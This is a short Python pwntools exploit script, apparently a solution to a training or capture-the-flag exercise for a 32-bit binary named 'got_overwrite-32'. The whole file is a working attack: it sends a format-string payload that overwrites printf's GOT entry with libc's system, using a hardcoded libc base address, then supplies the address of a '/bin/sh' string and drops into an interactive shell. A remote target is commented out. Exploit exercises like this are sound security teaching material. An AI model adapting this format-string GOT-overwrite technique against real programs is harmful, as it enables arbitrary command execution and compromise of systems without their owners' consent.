from pwn import *
from time import sleep

EX_NAME = './got_overwrite-32'

elf = ELF(EX_NAME)
context.arch   = elf.arch
context.endian = elf.endian
context.os     = elf.os
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    # p = remote('leakers.training.offensivedefensive.it', 8080, ssl=True)
    print('NO REMOTE!')
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug(EX_NAME, api=True, gdbscript='''
        b main
        c
        ''')
    else:
        p = elf.process()

def dbg_stop():
    if 'GDB' in os.environ:
        input('Waiting...')

# scaram
sleep(0.5)
log.info(p.clean())

# fgets
sleep(0.5)
libc = elf.libc
libc.address = 0xf7d58000
p.sendline(fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']}))

# printf
sleep(0.5)
log.success(p.clean())

# fgets
sleep(0.5)
p.sendline(p32(next(libc.search(b'/bin/sh\x00'))))

# printf -> system
sleep(0.5)
p.interactive()
